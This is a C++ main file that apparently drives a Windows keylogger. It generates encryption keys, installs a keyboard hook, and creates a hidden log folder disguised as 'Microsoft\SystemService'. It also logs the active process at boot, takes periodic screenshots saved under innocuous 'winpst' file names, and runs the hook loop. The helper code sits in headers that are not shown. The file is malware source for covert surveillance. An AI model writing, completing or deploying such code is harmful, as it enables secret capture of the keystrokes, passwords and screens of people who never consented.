#include "stream.h"
#include "keyhook.h"
#include "screen.h"
#include "sys.h"
#include "encrypt.h"
#include "net.h"

//#define DEBUG

int main() {
#ifdef DEBUG
#endif

#ifndef DEBUG
  Crypt::GenerateKeys();
  KeyHook::InstallHook();

  Stream::MakeDir(Stream::GetPath("\\Microsoft\\SystemService"));
  Stream::MakeFile();
  Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, true);

  Screen::CaptureScreen(Stream::GetPath(R"(\Microsoft\SystemService\)"),
						"winpst" + std::to_string(Screen::picId) + ".jpeg",
						false,
						1000,
						5);

  KeyHook::HandleMessage(true);
#endif
  return 0;
}


